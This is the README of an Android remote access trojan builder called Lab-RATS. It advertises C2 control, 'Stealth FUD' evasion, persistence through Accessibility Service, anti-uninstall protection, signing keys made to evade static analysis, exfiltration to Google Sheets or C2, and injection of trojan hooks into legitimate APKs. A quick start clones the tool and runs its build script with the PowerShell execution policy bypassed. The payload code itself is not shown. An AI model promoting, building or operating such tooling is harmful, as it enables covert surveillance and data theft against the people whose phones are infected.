# 🔥 Lab-RATS APK-Builder Tool

<img width="709" height="762" alt="Builder menu screenshot" src="https://github.com/user-attachments/assets/925a35b2-2719-42b2-918f-955b778c6d31" />

---

<img src="https://img.shields.io/badge/JDK-17_%7C_21-gold?style=for-the-badge&logo=openjdk&logoColor=white"> <img src="https://img.shields.io/badge/Gradle-8.10.2-C0181?style=for-the-badge&logo=gradle&logoColor=white">
<img src="https://img.shields.io/badge/Android-SDK_34-white?style=for-the-badge&logo=android&logoColor=white"> <img src="https://img.shields.io/badge/License-MIT-blue?style=for-the-badge&logo=opensourceinitiative&logoColor=white">
<img src="https://img.shields.io/badge/Focus-Remote_Access-red?style=for-the-badge&logo=airplayvideo&logoColor=white"> <img src="https://img.shields.io/badge/Security-AES_256-blueviolet?style=for-the-badge&logo=dependencycheck&logoColor=white">
<img src="https://img.shields.io/badge/Network-Direct_IPv6-darkred?style=for-the-badge&logo=p2p&logoColor=white"> <img src="https://img.shields.io/badge/Mode-Stealth_FUD-orange?style=for-the-badge&logo=ghost&logoColor=white">

---

> **This is a command-line tool.** There is no builder tab in the C2 dashboard — you build
> here, on the workstation, and the APK is the only thing that reaches the device.

---

## 👨‍💻 Developer: K4N3CO
- 🔗 GitHub: [github.com/K4N3CO](https://github.com/K4N3CO)
- 📦 Upstream: [github.com/K4N3CO/Lab-RATS-v1.6](https://github.com/K4N3CO/Lab-RATS-v1.6)

---

## ✨ Features (v1.6.0 Hardened)

| Feature                       | Description                                         |
| ----------------------------- | --------------------------------------------------- |
| 🛡️ **Dynamic Camouflage**      | Switch between 5 system-grade masquerade identities |
| 🕵️ **Ghost Watchdog**          | High-privilege persistence via Accessibility Service |
| 🔒 **Anti-Removal Shield**    | Protects against uninstallation and data clearing   |
| 🖥️ **Cross-Platform**         | Native Windows (.bat/.ps1), Linux, macOS support    |
| ☕ **Auto Java Setup**        | Checks and helps install Java JDK 17/21             |
| 🔐 **Unique Signing**         | Generates custom keystores to evade static analysis |
| 📝 **App Renaming**           | Full control over the visible application name      |
| 🌐 **Webhook Integration**    | Instant exfiltration to Google Sheets / C2          |
| 📦 **Infection Wizard**       | Automate Build -> Host -> Weaponize in one flow     |
| 💉 **Smali Surgery & Binder** | Decompile clean target APKs & inject Lab-RATS hooks |

---

## 🚀 Quick Start

### Windows

**PowerShell** *(execution policy blocks unsigned scripts by default)*
```powershell
git clone https://github.com/kool277/Lab-RATS-v1.6.git
cd Lab-RATS-v1.6/apk-builder
powershell -ExecutionPolicy Bypass -File .\build.ps1